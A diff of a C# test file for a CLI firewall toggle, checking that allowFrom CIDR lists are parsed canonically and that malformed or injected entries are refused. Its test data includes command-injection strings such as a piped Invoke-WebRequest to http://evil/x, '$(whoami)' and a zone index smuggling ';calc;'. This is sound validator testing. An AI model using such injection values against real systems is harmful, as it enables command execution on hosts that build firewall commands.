@@ -302,7 +302,6 @@ public sealed class DarlingEndpointToggleCliTests
     [InlineData("192.168.1.0/24 | Out-Null; Invoke-WebRequest http://evil/x")]
     [InlineData("$(whoami)")]
     [InlineData("Any")]                                                          // a real New-NetFirewallRule keyword — still not a CIDR
-    [InlineData("192.168.1.0/24,10.0.0.0/8")]                                    // one CIDR only
     [InlineData("192.168.1.5")]                                                  // a bare address, no prefix
     [InlineData("192.168.1.0/33")]                                               // prefix longer than the family allows
     [InlineData("not-a-cidr")]
@@ -312,6 +311,80 @@ public sealed class DarlingEndpointToggleCliTests
 
         /* The refusal path must hand back NOTHING usable: the toggle skips the firewall entirely rather than
            building a command from a partially-parsed value. */
+        Assert.Equal("", cidr);
+    }
+
+    /* ---------------- #5288: allowFrom is a CIDR LIST, parsed by the one CidrAllowList parser ----------------
+       The comma list that the single-CIDR pin above used to refuse ("one CIDR only") is now VALID, and it comes
+       back as the parser's canonical text: masked host bits, duplicates dropped, comma-joined, no spaces. */
+
+    [Theory]
+    [InlineData("192.168.1.0/24,10.0.0.0/8", "192.168.1.0/24,10.0.0.0/8")]
+    [InlineData(" 10.8.0.0/16 , 192.168.1.5/24 ", "10.8.0.0/16,192.168.1.0/24")]   // trimmed, host bits masked
+    [InlineData("10.0.0.0/8,10.0.0.0/8", "10.0.0.0/8")]                            // duplicates dropped
+    [InlineData("10.0.0.0/8,2001:db8::/32", "10.0.0.0/8,2001:db8::/32")]           // the family rule is the bind ladder's, not this gate's
+    public void ClassifyAllowFrom_List_IsValidCanonical(string allowFrom, string expected)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Valid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+        Assert.Equal(expected, cidr);
+
+        /* Every element that reaches the command is parser output: it re-parses to itself and carries no metacharacter. */
+        foreach (var element in cidr.Split(','))
+        {
+            Assert.True(IPNetwork.TryParse(element, out var reparsed));
+            Assert.Equal(element, reparsed.ToString());
+            foreach (var metacharacter in new[] { ";", "'", "|", "$", "`", " ", "\n", "&" })
+            {
+                Assert.DoesNotContain(metacharacter, element, StringComparison.Ordinal);
+            }
+        }
+    }
+
+    [Theory]
+    [InlineData("10.8.0.0/16,not-a-cidr")]
+    [InlineData("10.8.0.0/16,")]                                   // trailing comma: an empty entry is refused, not skipped
+    [InlineData(",10.8.0.0/16")]
+    [InlineData("10.8.0.0/16,,192.168.1.0/24")]
+    [InlineData("10.8.0.0/16, ,192.168.1.0/24")]
+    [InlineData(",")]
+    [InlineData("10.8.0.0/16;whoami,192.168.1.0/24")]
+    [InlineData("10.8.0.0/16,192.168.1.5")]                        // a bare address, no prefix
+    [InlineData("10.8.0.0/16,$(whoami)")]
+    [InlineData("10.8.0.0/16,'; whoami; '")]
+    [InlineData("::ffff:10.0.0.0/104,10.0.0.0/8")]                 // an IPv4-mapped entry can never match: refused
+    public void ClassifyAllowFrom_ListWithBadEntry_IsInvalid(string allowFrom)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Invalid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+
+        /* One bad entry refuses the WHOLE list and hands back nothing usable: no command is built from the good half. */
+        Assert.Equal("", cidr);
+    }
+
+    [Theory]
+    [InlineData("010.0.0.0/8")]                                    // a leading zero reads as octal: a different range
+    [InlineData("192.168.010.0/24")]
+    [InlineData("10/8")]                                           // short forms are zero-padded
+    [InlineData("10.1/16")]
+    [InlineData("0x0A.0.0.0/8")]                                   // 0x reads as hex
+    [InlineData("1.2.3.04/32")]
+    [InlineData("10.8.0.0/16,192.168.010.0/24")]                   // refused wherever it sits in the list
+    [InlineData("010.0.0.0/8,10.8.0.0/16")]
+    public void ClassifyAllowFrom_NonCanonicalIPv4_IsInvalid(string allowFrom)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Invalid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+
+        /* Nothing usable comes back: the toggle never builds a firewall command for a range it would have
+           read as a different one. */
+        Assert.Equal("", cidr);
+    }
+
+    [Theory]
+    [InlineData("fe80::1%5/64")]
+    [InlineData("fe80::1%x';calc;'/64")]
+    [InlineData("10.8.0.0/16,fe80::1%5/64")]
+    public void ClassifyAllowFrom_IPv6ZoneIndex_IsInvalid(string allowFrom)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Invalid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
         Assert.Equal("", cidr);
     }
 
